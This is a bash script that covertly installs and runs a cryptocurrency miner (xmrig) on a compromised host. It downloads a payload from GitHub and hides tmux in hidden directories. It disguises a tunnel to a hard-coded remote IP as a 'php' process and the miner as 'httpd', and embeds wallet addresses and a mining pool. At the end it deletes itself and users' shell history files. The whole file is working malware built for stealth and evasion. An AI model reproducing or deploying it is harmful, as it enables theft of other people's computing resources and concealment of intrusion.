#!/usr/bin/env bash
## needed tmux sed grep envsubst

## where are we
c=$(builtin compgen -G '/etc/cpa*')
d=$(builtin compgen -G '/dev/*')
s=$(builtin compgen -G '/sys/*')
p=$(builtin compgen -G '/proc/*')
jail=
if [ -n "$c" -o -z "$d" -o -z "$s" -o -z "$p" ]; then ## we are in a jail
    jail=1
fi

## get payload
BRANCH=master
wget https://github.com/untoreh/scripts/archive/${BRANCH}.tar.gz
tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
cd scripts-${BRANCH} || exit 1

## relocate tmux
trel=false
for ph in {/tmp,/dev/shm,~/}; do
    rm -rf ${ph}/.tmx && \
        mkdir -p ${ph}/.tmx && \
        mv pl/tmux ${ph}/.tmx/init && \
        export PATH=${ph}/.tmx:$PATH && \
        trel=${ph}/.tmx && break
done
[ $trel = false ] && { echo "couldn't relocate tmux" ; exit 1; }

## utility vars
CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/

## note quote vars that need quoting
cat <<SHAREDENV > shared.env
TERMINFO=pl/ \
TERM=tmux \
SHELL=$(/usr/bin/which bash) \
PATH=.:pl:$PATH \
HOME=${HOME:-/tmp}

SHAREDENV
[ -z "$SHELL" ] && echo "bash not found" && exit 1
[ ! -e shared.env ] && echo "error dumping shared env" && exit 1
source ./shared.env
SHENV="$(cat shared.env)"

## custom socket path for tmux (eval to expand reloc path)
eval "function tmx(){
    TMUX_TMPDIR=${trel} \
    $SHENV \
    init \"\$@\"
}" ; export -f tmx
## make sure tmux is working and also spawn a session with clean args
tmx kill-server &>/dev/null
tmx new -d || { echo "failed to start tmux"; exit 1 ; }
if [ $(tmx ls | wc -l) = 0 ]; then
    echo "nop session not found, exiting"
    exit 1
fi

## glibc not needed on standalone

## tnl
## $1 is the starting port (for overrides)
function gen_tstarter(){
    cat <<TSTARTER > tstarter
source shared.env
portavl() {
          if \$(busybox nc -z 127.0.0.1 \${TNL_LISTEN}); then
             return 1
          else
             return 0
          fi
}
checktnl() {
         local pid="\$(pgrep -xf "${TNL_MASK} ${TNL_ARGS}")"
         ## lsof or netstat require /proc so not reliable
         local port="\$(busybox nc -z 127.0.0.1 \${TNL_LISTEN} && echo 1)"
         local tss="\$(tmx ls | grep ${TNL_MASK})"
         if [ -z "\$pid" -o -z "\$port" -o -z "\$tss" ]; then ## order kind of matters
            return 1
         else
            return 0
         fi
}
starttnl(){
    ## starttnl should never be called more than once at a time
    if [ -n "\$(pgrep -xf "${TNL_MASK} ${TNL_ARGS}")" ]; then
       if [ -n "\$(tmx ls | grep "$TNL_MASK")" ]; then
          echo \${TNL_LISTEN}
          exit ## tnl started and already in session
       else ## a rogue tunnel not within its session kill it
          pkill -xf "${TNL_MASK} ${TNL_ARGS}"
       fi
    fi
    tmx kill-session -t ${TNL_MASK} &>/dev/null
    tmx new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
    sleep 1 ## time to bind
}

export TNL_LISTEN=\$1
for port in $TNL_PLIST; do
    if portavl; then
        starttnl
    else
        checktnl && exit 0 ## check again in case of late start
        export TNL_LISTEN=\$port
        envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
        continue
    fi
    if checktnl; then
        echo \${TNL_LISTEN}
        exit
    else
        export TNL_LISTEN=\$port
        envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
    fi
done

exit 1

TSTARTER
    chmod +x tstarter
    return $?
}

function setup_tnl(){
    TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
    TNL_PLIST="80 443 20 21 465 993 995 110 123 2703 3036 8080 8081 8082 9000 10000"
    TNL_CFG=${TNL_CFG:-gst.json}
    TNL_PATH=${TNL_PATH:-$(/usr/bin/which gst)}
    TNL_MASK=${TNL_MASK:-php}
    TNL_CFG_MASK=${TNL_CFG_MASK:-php.ini}
    TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}
    ## download cfg
    if [ ! -e "${TNL_CFG_MASK}.tpl" ]; then
        wget -q "${CFG_BASE_URL}${TNL_CFG}" -O "${TNL_CFG_MASK}.tpl"
    fi
    ## mask
    if [ -e "$TNL_PATH" ]; then
        mv "$TNL_PATH" "$(dirname ${TNL_PATH})/${TNL_MASK}"
    fi
    ## config with needed vars
    if [ "$jail" -o -n "$(uname -r | grep -E ^2\.6\.[0-9]*\|^3\.1[0-9]*)" ]; then
        TNL_PROTO=${TNL_PROTO:-socks}
    fi
    if [ "$lowhw" ]; then
        TNL_TARGET=${TNL_TARGET:-pool.supportaeon.com:3333}
    fi
    export TNL_REMOTE="$TNL_REMOTE" \
           TNL_LISTEN=${TNL_LISTEN:-8080} \
           TNL_PROTO \
           TNL_TARGET
    envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
    gen_tstarter && TNL_LISTEN=$(./tstarter ${TNL_LISTEN})
    export TNL_LISTEN ## tstarter should echo the working port
}; setup_tnl

OBJ_MASK=${OBJ_MASK:-httpd}
PAUSD_DAEMON=${PAUSD_DAEMON:-pausd}
OBJ_CFG=${OBJ_CFG:-httpd-1.conf}
PAUSD_ARGS=${PAUSD_ARGS:-${OBJ_MASK} ${OBJ_MASK}.conf}

## download cfg
if [ ! -e "$OBJ_CFG" ]; then
	wget -q "${CFG_BASE_URL}${OBJ_CFG}" -O "${OBJ_MASK}.conf.tpl"
fi

## object in sln should be present in pl/
OBJ_NAME=${OBJ_NAME:-xmrig}
mv pl/${OBJ_NAME} ${OBJ_MASK}
chmod +x ${OBJ_MASK} &>/dev/null

## daemon
# (when not included in the payload)
# PAUSD_DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${PAUSD_DAEMON}
# wget -q ${PAUSD_DAEMON_URL}
chmod +x ${PAUSD_DAEMON} &>/dev/null

## daemon conf
## misc
[ $(id -u) != 0 ] && sudo=$(/usr/bin/which sudo 2>/dev/null)
echo 128 | $sudo tee /proc/sys/vm/nr_hugepages
## instance ID
CPU=$(cat /proc/cpuinfo | grep "model name" | head -1 | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
CORES=$(cat /proc/cpuinfo| grep "cpu cores" | wc -l)
DATE=$(date +%s)
IPADDR=$(wget -qO- ipinfo.io/ip)
HOSTN=$(hostname)
## cpu
cpu_p=$(cat /sys/fs/cgroup/cpuacct,cpu/cpu.cfs_period_us 2>/dev/null)
cpu_q=$(cat /sys/fs/cgroup/cpuacct,cpu/cpu.cfs_quota_us 2>/dev/null)
if [ -n "$cpu_p" -a -n "$cpu_q" ]; then ## respect cgroups
    ACORES=$((cpu_p / cpu_q)) ## the available cpu (in number of cores)
    ## compose a binary string to map affinity (printf from bash or non busybox)
    if [ "$ACORES" = 1 -a "$CORES" -gt 1 ]; then ## if max cpu is one and more threads are possible, use 2 threads
        bin_s=$(printf '0\n%.0s' $(seq 1 $((CORES - 2))))$(printf "\n1\n1") ## append two cores
        PAUSD_THREADS=${PAUSD_THREADS:-2}
    else ## just use as many available cores
        bin_s=$(printf '0\n%.0s' $(seq 1 $((CORES - ACORES))))$(printf '\n1%.0s' $(seq 1 $ACORES))
        PAUSD_THREADS=${PAUSD_THREADS:-$ACORES}
    fi
else ## no cgroups, use all cores
    bin_s=$(printf '0\n%.0s' $(seq 1 $CORES))
    PAUSD_THREADS=${PAUSD_THREADS:-$CORES}
fi
## shuffle affinity and get hex string
bin_s=$(echo "$bin_s" | shuf | while read c; do echo -n $c; done) ## shuffle
hex_s=$(printf '%x\n' "$((2#$bin_s))") ## hex string, bashism
if [ -z "$hex_s" -o "$hex_s" = 0 ]; then
    export AFFINITY="0x0"
else
    export AFFINITY="0x$hex_s"
fi

## vars set through tmux
export PAUSD_THREADS PAUSD_VER=${PAUSD_VER:-2}
export PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
PAUSD_RATE=${PAUSD_RATE:-200}

export \
ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
AL=${AL:-cryptonight} \
ENDPOINT=${ENDPOINT:-127.0.0.1:${TNL_LISTEN}}

## set vars used by pausd daemon in tmux and envsubst
for v in $(builtin compgen -A variable | grep ^PAUSD); do
    export $v
    tmx setenv -g $v "${!v}" ; done

## subst
cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf

## init
tmx new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
sleep 1 ## give time to fail

## cleanup
## wait for tmux session to startup
slept=0
while [ "$(tmx list-panes -t ${PAUSD_DAEMON} | wc -l)" -lt 2 ]; do
    slept=$((slept+1))
    if [ $slept -gt 5 ]; then ## no aes means crash means aeon
        ## try without hw accel
        PAUSD_VER=${PAUSD_VER/1/3} PAUSD_VER=${PAUSD_VER/2/4} && export PAUSD_VER
        ## switch PA to different co
        PA="WmsNJ3Usa4T7AbXz6ZRTdi5hjrqeXsGFMHEEwpv5g2sbgtEWxJZeBA4hqMusHAyWBVaDktNhZHTvTd6RfngAJNpF1wDzwqaNo"
        ## change algo
        AL="cryptonight-lite"
        ## subst
        cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
        ## resetup tnl to correct target
        lowhw=1 setup_tnl
        ## update endpoint according to new tnl port
        ENDPOINT=${${ENDPOINT/:*/}:${TNL_LISTEN}}
        ## init
        tmx kill-session -t ${PAUSD_DAEMON}
        tmx new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
        while [ "$(tmx list-panes -t ${PAUSD_DAEMON} | wc -l)" -lt 2 ]; do sleep 1; done
        break
    fi
    sleep 1;
done
sleep 1 ## once more for edge cases

## stop noop tmux session
tmx kill-session -t 0

cd ..
## debug
[ "$DEBUG" ] && env>dump.env && exit

rm -rf -- "$0" \
   "scripts-${BRANCH}" \
   "$HOME"/.*_history \
   /.*_history
